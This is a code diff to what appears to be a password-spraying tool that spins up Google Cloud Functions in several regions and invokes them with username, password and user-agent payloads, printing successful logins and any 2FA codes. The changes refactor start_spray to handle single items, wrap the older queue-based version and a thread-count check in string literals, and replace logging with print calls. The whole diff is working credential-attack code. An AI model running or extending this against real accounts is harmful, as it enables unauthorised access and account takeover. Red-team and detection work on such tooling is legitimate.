@@ -102,6 +102,22 @@ def clear_credentials(username, password):
     credentials = c
 
 
+def start_spray(sa_credentials, function_name, args, item):
+    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
+    function = service.projects().locations().functions()
+    if item is None:
+        return
+    print(item)
+
+    payload = {}
+    payload['username'] = item['username']
+    payload['password'] = item['password']
+    payload['useragent'] = item['useragent']
+    payload['args'] = args
+    body = {"data": json.dumps(payload)}
+    invoke_function(function, function_name, body)
+
+'''
 def start_spray(sa_credentials, function_name, args):
     service = build('cloudfunctions', 'v1', credentials=sa_credentials)
     function = service.projects().locations().functions()
@@ -121,6 +137,7 @@ def start_spray(sa_credentials, function_name, args):
         invoke_function(function, function_name, body)
 
         q.task_done()
+'''
 
 
 def load_credentials(user_file, password_file, useragent_file=None):
@@ -161,8 +178,11 @@ def create_functions(sa_credentials, locations, project_id, source_url, thread_c
 
     if thread_count > len(location_names):
         threads = len(location_names)
+    # Commenting out as this checked for earlier
+    '''
     elif thread_count > len(credentials['accounts']):
         threads = len(credentials['accounts'])
+    '''
     log_entry(f"Number of functions to be created: {threads}")
     function_names = []
     function = locations.functions()
@@ -267,10 +287,10 @@ def invoke_function(function, function_name, payload):
     user, password = return_payload['username'], return_payload['password']
     code_2fa = return_payload['code']
     if return_payload['success']:
-        clear_credentials(user, password)
-        log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
+        # clear_credentials(user, password)
+        print('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
     else:
-        log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))
+        print('(FAILED) {} / {} -> Failed.'.format(user, password))
 
 
 def delete_function(function, function_name):
